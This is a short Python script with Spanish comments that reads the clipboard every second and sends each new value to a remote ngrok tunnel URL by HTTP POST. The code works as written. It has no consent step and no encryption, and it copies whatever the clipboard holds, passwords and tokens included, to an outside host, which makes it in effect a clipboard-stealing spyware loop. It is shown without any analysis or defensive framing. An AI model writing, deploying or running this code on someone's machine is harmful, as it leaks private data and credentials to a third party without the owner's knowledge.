import pyperclip
import requests
import time

NGROK_URL = "https://ae33-187-146-168-71.ngrok-free.app"  # Sustituye con tu URL real

last_clipboard = ""

while True:
    try:
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard:
            requests.post(NGROK_URL, data=current_clipboard.encode("utf-8"))
            print("📤 Enviado:", current_clipboard)
            last_clipboard = current_clipboard
    except Exception as e:
        print("Error:", e)
    time.sleep(1)
